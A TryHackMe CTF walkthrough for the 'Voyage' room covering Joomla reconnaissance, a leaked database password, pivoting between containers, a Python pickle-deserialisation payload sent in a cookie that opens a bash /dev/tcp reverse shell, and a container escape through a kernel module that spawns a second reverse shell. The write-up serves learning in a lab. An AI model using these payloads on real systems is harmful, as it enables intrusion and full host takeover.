<h1 align="center">Voyage</h1>
<p align="center"><img width="80px" src="ttps://github.com/user-attachments/assets/a8f21cd2-2cc8-4d78-8755-4a91ee36f507"><br>
2025, Spetember 1<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>483</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Chain multiple vulnerabilities to gain control of a system</em>.<br>
Access it <a href="https://tryhackme.com/room/voyage"</a>here.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/636454cc-082f-471e-9edc-cc6e7b8a397f"></p>

<br>
<br>

<h2>Task 1 . Voyage</h2>

<p>Sometimes in a pentest, you get root access very quickly. But is it the real root or just a container? The voyage might still be going on.<br>

Start the VM by clicking the Start Machine button at the top right of the task. You can complete the challenge by connecting through VPN or the AttackBox containing all the essential tools.</p>

<p><em>Answer the questions below</em></p>

<br>

<h2>Nikto</h2>

```bash
:~/Voyage# nikto -h xx.xxx.xx.xx
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xx.xx
+ Target Hostname:    ip-xx-xxx-xx-xx.ec2.internal
+ Target Port:        80
+ Start Time:         2025-09-01 xx:xx:xx9 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.58 (Ubuntu)
+ Cookie 310c29008fc04f792e0bccb4682e5b78 created without the httponly flag
+ Uncommon header 'x-frame-options' found, with contents: SAMEORIGIN
+ Uncommon header 'cross-origin-opener-policy' found, with contents: same-origin
+ Uncommon header 'referrer-policy' found, with contents: strict-origin-when-cross-origin
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x2fc 0x5f38101bc4640 
+ Cookie 03245e095856e4447d1dfb528d67c5d3 created without the httponly flag
+ File/dir '/administrator/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Retrieved x-powered-by header: JoomlaAPI/1.0
+ File/dir '/cache/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir '/cli/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir '/components/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir '/includes/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir '/language/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir '/layouts/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir '/modules/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir '/plugins/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir '/tmp/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 15 entries which should be manually viewed.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-877: HTTP TRACK method is active, suggesting the host is vulnerable to XST
+ OSVDB-8193: /index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc: EW FileManager for PostNuke allows arbitrary file retrieval.
+ OSVDB-3092: /administrator/: This might be interesting...
+ OSVDB-3092: /includes/: This might be interesting...
+ OSVDB-3092: /tmp/: This might be interesting...
+ OSVDB-3092: /LICENSE.txt: License file found may identify site software.
+ /htaccess.txt: Default Joomla! htaccess.txt file found. This should be removed or renamed.
+ /administrator/index.php: Admin login page/section found.
+ 6544 items checked: 0 error(s) and 27 item(s) reported on remote host
+ End Time:           2025-09-01 xx:xx:xx (GMT1) (27 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<h2>Nmap</h2>

```bash
:~/Voyage# nmap -sT -p- -T4 xx.xxx.xx.xx
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```

```bash
:~/Voyage# nmap -A xx.xxx.xx.xx -p 22,80,2222
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 16 disallowed entries (15 shown)
| /joomla/administrator/ /administrator/ /api/ /bin/ 
| /cache/ /cli/ /components/ /includes/ /installation/ 
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Home
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
```

<h2>xx.xxx.xx.xx or xx.xxx.xx.xx/index.php</h2>
<p>
  
- grid-child container-component<br>mod-breadcrumbs__wrapper<br>Breadcrumbs<br>mod-breadcrumbs breadcrumb px-3 py-2<br>mod-breadcrumbs__item breadcrumb-item activ<br><br>
- system-message-container<br>polite<br>https://schema.org/Blog<br><br>
- grid-child container-sidebar-right<br>action= index.php, method=post<br><br>
- sidebar-right card<br>mod-login__userdata userdata<br>mod-login__username form-group<br>input-group<br>type="text" name="username" class="form-control" autocomplete="username" placeholder="Username"><br>class="input-group-text" title="Username"<br>
- mod-login__password form-group<br>type="password" name="password" autocomplete="current-password" class="form-control" placeholder="Password"><br>mod-login__remember form-group<br>Remember Me<br>mod-login__options list-unstyled<br><br>
- /index.php/component/users/reset?Itemid=101<br><br>Forgot your password?<br>/index.php/component/users/remind?Itemid=101<br><br>Forgot your username?<br><br>type="hidden" name="option" value="com_users"<br>put type="hidden" name="task" value="user.login"<br>type="hidden" name="return" value="aHR0cDovLzEwLjIwMS40MS40MS8="<br>type="hidden" name="86785eab33b627e9955afd7cd086754c" value="1"</p>

<img width="1107" height="502" alt="image" src="https://github.com/user-attachments/assets/38872d3b-2f2c-4042-bbce-33b61d81a9f3" />


<h2>xx.xxx.xx.xx/robots.txt</h2>

```bash
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

<h2>xx.xxx.xx.xx/administrator</h2>

<img width="1121" height="602" alt="image" src="https://github.com/user-attachments/assets/e5f389ec-6f21-4acc-8a7a-933799133afa" />

<h2>xx.xxx.xx.xx/administrator/components</h2>

<img width="1127" height="571" alt="image" src="https://github.com/user-attachments/assets/e9d94931-49f5-468e-a49a-6d23660865b4" />

<h2>xx.xxx.xx.xx/administrator/manisfests/files/joomla.xml</h2>
<p>

- type="file" method="upgrade"<br>
- admin@joomla.org<br>
- version = 4.2.7</p>
- creation date = 2023-01<br>
- script file = administrator/components/com_admin/script.php<br>
- schema path type = mysql = administrator/components/com_admin/sql/updates/mysql<br>
- schema path type = postgresql = administrator/components/com_admin/sql/updates/postgresql<br>
- administrator, api, cache, cli, components, images, includes, language, layouts, libraries, media, modules, plugins, templates, tmp, htaccess.txt, web.config.txt, LICENSE.txt, README.txt, index.php<b>
- name = Joomla! Core<br>
- type = collection = https://update.joomla.ord/core/list.xml</p>

<img width="1120" height="565" alt="image" src="https://github.com/user-attachments/assets/2b65afdd-ccdb-43b1-a5b3-ea3ca1b2d81a" />

<br>
<h2>xx.xxx.xx.xxapi/index.php/v1/config/application?public=true</h2>

<p>

- root : RootPassword@1234</p>

```bash
{
  "links": {
    "self": "http://xx.xxx.xx.xx/api/index.php/v1/config/application?public=true",
    "next": "http://xx.xxx.xx.xx/api/index.php/v1/config/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20",
    "last": "http://xx.xxx.xx.xx/api/index.php/v1/config/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"
  },
  "data": [
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "offline": false,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "offline_message": "This site is down for maintenance.<br>Please check back again soon.",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "display_offline_message": 1,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "offline_image": "",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "sitename": "Tourism",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "editor": "tinymce",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "captcha": "0",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "list_limit": 20,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "access": 1,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "debug": false,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "debug_lang": false,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "debug_lang_const": true,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbtype": "mysqli",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "host": "localhost",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "user": "root",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "password": "RootPassword@1234",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "db": "joomla_db",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbprefix": "ecsjh_",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbencryption": 0,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbsslverifyservercert": false,
        "id": 224
      }
    }
  ],
  "meta": {
    "total-pages": 4
  }
}
```

<h2>SSH</h2>

```bash
:~/Voyage# ssh root@xx.xxx.xx.xx -p 2222
...
root@f5eb774507f2:~#
```

<img width="1169" height="372" alt="image" src="https://github.com/user-attachments/assets/1907b64c-2e45-4c60-b071-9c6d25cbe739" />

```bash
root@f5eb774507f2:~# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
root@f5eb774507f2:~# pwd
/root
```

```bash
root@f5eb774507f2:~# cat .bash_history
ls
curl
nmap
socat
exit
```

```bash
root@f5eb774507f2:~# getent hosts
127.0.0.1       localhost
127.0.0.1       localhost ip6-localhost ip6-loopback
192.168.100.10  f5eb774507f2
```

```bash
root@f5eb774507f2:~# ss
Netid          State           Recv-Q           Send-Q                      Local Address:Port                       Peer Address:Port           Process        
u_str          ESTAB           0                0                                       * 14898                                 * 0                             
tcp            ESTAB           0                0                          192.168.100.10:22                        xx.xxx.xx.xxx:39128                         
```

<h2>Nmap</h2>

```bash
root@f5eb774507f2:/tmp# wget http://xx.xxx.xx.xxx:8000/nmap-x64.tar.gz
--2025-09-01 xx:xx:xx--  http://xx.xxx.xx.xxx:8000/nmap-x64.tar.gz
Connecting to xx.xxx.xx.xxx:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10686789 (10M) [application/gzip]
Saving to: \u2018nmap-x64.tar.gz\u2019

nmap-x64.tar.gz                          100%[================================================================================>]  10.19M  --.-KB/s    in 0.09s   
```

```bash
root@f5eb774507f2:/tmp# tar -xzf nmap-x64.tar.gz
```

<p>

- 192.168.100.1 : 22, 80, 2222, 5000<br>
- 192.168.100.12 : 5000<br>
- 192.168.100.10 : 22</p>

```bash
root@f5eb774507f2:/tmp# ./nmap 192.168.100.0/24
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1
5000/tcp open  upnp
MAC Address: 02:42:39:08:21:F6 (Unknown)

Nmap scan report for voyage_priv2.joomla-net (192.168.100.12)
Host is up (0.0000070s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
5000/tcp open  upnp
MAC Address: 02:42:C0:A8:64:0C (Unknown)

Nmap scan report for f5eb774507f2 (192.168.100.10)
Host is up (0.000020s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 256 IP addresses (3 hosts up) scanned in 2.03 seconds
```

```bash
root@f5eb774507f2:/tmp# ./nmap -sC -sV -p- -Pn -T4 192.168.100.12
...
PORT     STATE SERVICE VERSION
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.1.3 Python/3.10.12
|     Date: Mon, 01 Sep 2025 xx:xx:xx GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1942
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <title>Tourism Secret Finance Panel</title>
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     </head>
|     <body style="background: linear-gradient(135deg, #e0f7fa, #80deea); min-height: 100vh;">
|     <!-- Navbar -->
|     <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
|     <div class="container-fluid">
|     class="navbar-brand" href="#">
|     Secret Panel</a>
|     <div class="collapse navbar-collapse">
|     class="navbar-nav ms-auto">
|     class="nav-item">
|     class="nav-link active" href="#">Login (Under Dev)</a>
|     </li>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
```

<img width="1172" height="817" alt="image" src="https://github.com/user-attachments/assets/fd038757-492a-4811-8b89-4e9237e92a2a" />

<br>

```bash
:~/Voyage# ssh root@xx.xxx.xx.xx -p 2222 -L 5000:192.168.100.12:5000
root@xx.xxx.xx.xx's password: 
...
root@f5eb774507f2:~#
```

```bash
root@f5eb774507f2:~# id
uid=0(root) gid=0(root) groups=0(root)
root@f5eb774507f2:~# pwd
/root
root@f5eb774507f2:~# ls
root@f5eb774507f2:~# ls -lah
total 24K
drwx------ 1 root root 4.0K Jun 25 18:02 .
drwxr-xr-x 1 root root 4.0K Sep  1 14:38 ..
-rw------- 1 root root 1.1K Sep  1 15:02 .bash_history
-rw-r--r-- 1 root root 3.1K Dec  5  2019 .bashrc
drwx------ 2 root root 4.0K Jun 25 18:01 .cache
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
```


<h2>Port forwarding</h2>

```bash
root@f5eb774507f2:/tmp# socat tcp-listen:5000,fork,reuseaddr tcp:192.168.100.12:5000 &
[1] 40
```

```bash
root@f5eb774507f2:/tmp# ss
Netid          State           Recv-Q           Send-Q                      Local Address:Port                       Peer Address:Port           Process          
u_dgr          ESTAB           0                0                                       * 17398                                 * 17397                           
u_dgr          ESTAB           0                0                                       * 17397                                 * 17398                           
u_str          ESTAB           0                0                                       * 14898                                 * 0                               
tcp            ESTAB           0                0                          192.168.100.10:22                        xx.xxx.xx.xxx:39128                           
```


<h2>xx.xxx.xx.xx:5000</h2>

<img width="1130" height="322" alt="image" src="https://github.com/user-attachments/assets/50a77637-194c-4eee-b9dd-9404b11be760" />

<br>

<img width="1124" height="597" alt="image" src="https://github.com/user-attachments/assets/2375179a-9059-4716-8ca2-641d34c9d7ce" />

<br>
<h2>xx.xxx.xx.xx/api/index.php/v1/config/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20</h2>

<p>

- application : gJ48pkrbAgOwhNgn<br>
- mailfrom: mail@tourism.thm<br>
- fromname: Tourism<br>
- /usr/sbin/sendmail</p>

<h2>xx.xxx.xx.xx/api/index.php/v1/config/application?public=true</h2>

- root : RootPassword@1234 (for SSH)</p>

<h2>xx.xxx.xx.xx:5000</h2>

<img width="1126" height="416" alt="image" src="https://github.com/user-attachments/assets/c9eb33bd-dec1-4577-b5de-24d12d6a3af6" />

<img width="1126" height="375" alt="image" src="https://github.com/user-attachments/assets/246918e6-d825-42fe-8e34-ecef704804d4" />

<h6>Request</h6>

```bash
POST / HTTP/1.1
Host: xx.xxx.xx.xx:5000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://xx.xxx.xx.xx:5000/
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Origin: http://xx.xxx.xx.xx:5000
Connection: keep-alive
Cookie: 310c29008fc04f792e0bccb4682e5b78=hdhemeem9c18nuokgl3an0j7s8; session_data=8004952c000000000000007d94288c0475736572948c0b6170706c69636174696f6e948c07726576656e7565948c05383530303094752e; session_data=8004952c000000000000007d94288c0475736572948c0b6170706c69636174696f6e948c07726576656e7565948c05383530303094752e
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=application&password=gJ48pkrbAgOwhNgn
```

<h6>Response</h6>
<p>

- Secret Panel</p>

```bash
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.10.12
Date: Mon, 01 Sep 2025 xx:xx:xx GMT
Content-Type: text/html; charset=utf-8
Content-Length: 3570
Set-Cookie: session_data=8004952c000000000000007d94288c0475736572948c0b6170706c69636174696f6e948c07726576656e7565948c05383530303094752e; Path=/
Connection: close

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Tourism Secret Finance Panel</title>
    <link rel="stylesheet" href="/static/css/bootstrap.min.css">
</head>
<body style="background: linear-gradient(135deg, #e0f7fa, #80deea); min-height: 100vh;">
    <!-- Navbar -->
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container-fluid">
            <a class="navbar-brand" href="#">? Secret Panel</a>
            <div class="collapse navbar-collapse">
                <ul class="navbar-nav ms-auto">
                    <li class="nav-item">
                        <a class="nav-link active" href="#">Login (Under Dev)</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <!-- Main Section -->
    <div class="container mt-5">
        

        
            <!-- Dashboard with Secret Table -->
            <div class="card shadow-lg mx-auto" style="max-width: 800px;">
                <div class="card-body">
                    <h3 class="card-title text-center">?? Welcome application</h3>
                    <p class="text-center mb-4">? Quarterly Revenue: <strong>$85000</strong></p>

                    <!-- Secret Investors Table -->
                    <div class="table-responsive">
                        <table class="table table-hover table-dark table-bordered text-center">
                            <thead>
                                <tr class="table-active">
                                    <th scope="col">Investor ID</th>
                                    <th scope="col">Name</th>
                                    <th scope="col">Investment ($)</th>
                                    <th scope="col">Status</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td>INV-007</td>
                                    <td>John Matrix</td>
                                    <td>2,500,000</td>
                                    <td><span class="badge bg-success">Active</span></td>
                                </tr>
                                <tr>
                                    <td>INV-042</td>
                                    <td>Elena Shadow</td>
                                    <td>1,800,000</td>
                                    <td><span class="badge bg-warning text-dark">Pending</span></td>
                                </tr>
                                <tr>
                                    <td>INV-133</td>
                                    <td>Victor Night</td>
                                    <td>3,000,000</td>
                                    <td><span class="badge bg-danger">Flagged</span></td>
                                </tr>
                                <tr>
                                    <td>INV-666</td>
                                    <td>Anonymous</td>
                                    <td>???</td>
                                    <td><span class="badge bg-secondary">Unknown</span></td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                    <p class="text-muted text-center fst-italic mt-3">Classified Investor List - Handle with Caution</p>
                </div>
            </div>
        
    </div>

    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

<h2>linpeas.sh</h2>

<p>
	
- admin : password</p>

```bash
[+] Searching tables inside readable .db/.sqlite files (limit 100)

[+] Web files?(output limit)

[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
-rw-r--r-- 1 root root 2319 Feb 25  2020 /etc/bash.bashrc
-rw-r--r-- 1 root root 3771 Feb 25  2020 /etc/skel/.bashrc
-rw-r--r-- 1 root root 807 Feb 25  2020 /etc/skel/.profile
lrwxrwxrwx 1 root root 35 Apr  4 02:03 /etc/systemd/system/timers.target.wants/motd-news.timer -> /lib/systemd/system/motd-news.timer
-rw------- 1 root root 24 Jun 25 18:02 /root/.bash_history
Searching possible passwords inside /root/.bash_history (limit 100)

-rw-r--r-- 1 root root 3106 Dec  5  2019 /root/.bashrc
-rw-r--r-- 1 root root 161 Dec  5  2019 /root/.profile
-rw-r--r-- 1 1000 1000 18460 Oct 12  2020 /tmp/nselib/data/mgroupnames.db
-rwxr-xr-x 1 root root 700 Apr  3  2023 /usr/lib/openssh/agent-launch
-rw-r--r-- 1 root root 3106 Jan  2  2024 /usr/share/base-files/dot.bashrc

[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 220 Feb 25  2020 /etc/skel/.bash_logout
-rw------- 1 root root 0 Apr  4 02:03 /etc/.pwd.lock
-rwxr-xr-x 1 root root 0 Jun 25 18:01 /.dockerenv
...
[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
/etc/nsswitch.conf:passwd:         files systemd
/etc/pam.d/common-password:password	[success=1 default=ignore]	pam_unix.so obscure sha512
/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
/etc/security/namespace.init:        passwd=$(getent passwd "$user")
/etc/ssl/openssl.cnf:challengePassword		= A challenge password
/etc/ssl/openssl.cnf:challengePassword_max		= 20
/etc/ssl/openssl.cnf:challengePassword_min		= 4
...
...nsswitch.conf:passwd:         files systemd
/etc/pam.d/common-password:password	[success=1 default=ignore]	pam_unix.so obscure sha512
/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
/etc/security/namespace.init:        passwd=$(getent passwd "$user")
/etc/ssl/openssl.cnf:challengePassword		= A challenge password
/etc/ssl/openssl.cnf:challengePassword_max		= 20
/etc/ssl/openssl.cnf:challengePassword_min
```

<h2>Reverse Shell</h2>

```bash
:~/Voyage# cat script.py
import pickle
import os

class Malicious:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'bash -i >& /dev/tcp/xx.xxx.xx.xxx/6666 0>&1'",))

malicious_pickle = pickle.dumps(Malicious())

print("Malicious pickle in hex:", malicious_pickle.hex())
```


```bash
:~/Voyage# python3 script.py
Malicious pickle in hex: 80049555000000000000008c05706f736978948c0673797374656d9493948c3a2f62696e2f62617368202d63202762617368202d69203e26202f6465762f7463702f31302e3230312e38392e3230332f3636363620303e26312794859452942e
```

<h2>Listener</h2>

```bash
:~/Voyage# nc -nlvp 443
```

<h2>Burp Suite</h2>

<h6>Request</h6>

```bash
GET / HTTP/1.1
Host: xx.xxx.xx.xx:5000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html, application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http:/xx.xxx.xx.xx:5000/
Cookie: session_data=80049555000000000000008c05706f736978948c0673797374656d9493948c3a2f62696e2f62617368202d63202762617368202d69203e26202f6465762f7463702f31302e3230312e38392e3230332f3636363620303e26312794859452942e
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetcg-Site: none
Sect-Fetch-User: ?1
Priority: u=0; i
```

```bash
:~/Voyage# nc -nlvp 443
...
root@d221f7bc7bf8:/finance-app# python3 -c 'import pty;pty.spawn("/bin/bash")'
<app# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@d221f7bc7bf8:/finance-app# ^Z
[1]+  Stopped                 nc -nlvp 443
:~/Voyage# stty raw -echo; fg
nc -nlvp 443

root@d221f7bc7bf8:/finance-app# export TERM=xterm
root@d221f7bc7bf8:/finance-app# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
root@d221f7bc7bf8:/home# cd /root
root@d221f7bc7bf8:~# ls -lah
total 140K
drwx------ 1 root root 4.0K Jun 25 14:53 .
drwxr-xr-x 1 root root 4.0K Jun 26 18:36 ..
-rw-r--r-- 1 root root  137 Jun 25 14:48 .Module.symvers.cmd
-rw------- 1 root root  446 Jun 26 18:37 .bash_history
-rw-r--r-- 1 root root 3.1K Oct 15  2021 .bashrc
drwxr-xr-x 3 root root 4.0K Jun 24 12:21 .local
-rw-r--r-- 1 root root   86 Jun 25 14:48 .modules.order.cmd
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
-rw-r--r-- 1 root root  163 Jun 25 14:48 .revshell.ko.cmd
-rw-r--r-- 1 root root  120 Jun 25 14:48 .revshell.mod.cmd
-rw-r--r-- 1 root root  45K Jun 25 14:48 .revshell.mod.o.cmd
-rw-r--r-- 1 root root  44K Jun 25 14:48 .revshell.o.cmd
-rw-r--r-- 1 root root   38 Jun 24 15:17 user.txt
```

```bash
root@d221f7bc7bf8:~# cat user.txt
THM{********************************}
```

<br>
<p>1.1. What is the value of user-level flag?<br>
<code>THM{********************************}</code></p>
<br>
<br>
<h2>Capabilities</h2>

```bash
root@d221f7bc7bf8:/finance-app# capsh --print
Current: cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Ambient set =
Current IAB: !cap_dac_read_search,!cap_linux_immutable,!cap_net_broadcast,!cap_net_admin,!cap_ipc_lock,!cap_ipc_owner,!cap_sys_rawio,!cap_sys_ptrace,!cap_sys_pacct,!cap_sys_admin,!cap_sys_boot,!cap_sys_nice,!cap_sys_resource,!cap_sys_time,!cap_sys_tty_config,!cap_lease,!cap_audit_control,!cap_mac_override,!cap_mac_admin,!cap_syslog,!cap_wake_alarm,!cap_block_suspend,!cap_audit_read,!cap_perfmon,!cap_bpf,!cap_checkpoint_restore
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=0(root) euid=0(root)
gid=0(root)
groups=0(root)
Guessed mode: UNCERTAIN (0)
```

<h2>bash_history</h2>

```bash
root@d221f7bc7bf8:~# cat .bash_history
exit
ls
exit
ls
curl 10.10.9.89:9000/hello.c > hello.c
ls
curl 10.10.9.89:9000/Makefile > Makefile
make
ls
mv hello.c revshell.c
ls
make
insmod revshell.ko
exit
ls
cd ~
;s
ls
rm Makefile 
rm Module.symvers 
rm modules.order 
rm revshell.
rm revshell.c 
rm revshell.ko 
rm revshell.mod
rm revshell.mod.c 
rm revshell.mod.o 
rm revshell.o 
clear
ls
cd /home/
ls
cd /root/
ls
exit
ls
cd templates/
ls
cat index.html 
nano index.html 
exit
exit
exit
```

<h2>Makefile</h2>

```bash
root@d221f7bc7bf8:/tmp# nano Makefile
```

```bash
obj-m +=shell.o
all:
	make -C /lib/modules/6.8.0-1030-aws/build M=$(PWD) modules
clean:
	make -C /lib/modules/6.8.0-1030-aws/build M=$(PWD) clean
```

<h2>shell.c</h2>

```bash
root@d221f7bc7bf8:/tmp# nano shell.c
```

```bash
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kmod.h>

MODULE_LICENSE("GPL");

static int shell(void){
	char *argv[] ={"/bin/bash", "-c", "bash -i >& /dev/tcp/xx.xxx.xx.xxx/5555 0>&1", NULL};
	static char *env[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}

static int init_mod(void){
	return shell();
}

static void exit_mod(void){
	return;
}

module_init(init_mod);
module_exit(exit_mod);
```

<h2>shell.ko compiling</h2>

```bash
root@d221f7bc7bf8:/tmp# ls
Makefile  shell.c
```

```bash
root@d221f7bc7bf8:/tmp# make
```

<h2>Listener</h2>

```bash
:~/Voyage# nc -nlvp 5555
Listening on 0.0.0.0 5555
```

<h2>shell.ko installation</h2>

```bash
root@d221f7bc7bf8:/tmp# insmod shell.ko
```

<h3>Shell as Root</h3>

```bash
:~/Voyage# nc -nlvp 5555
Listening on 0.0.0.0 5555
...
root@tryhackme-2404:/# id
uid=0(root) gid=0(root) groups=0(root)
root@tryhackme-2404:/# pwd
/
root@tryhackme-2404:/# cd /root
root@tryhackme-2404:/root# ls
root.txt
snap
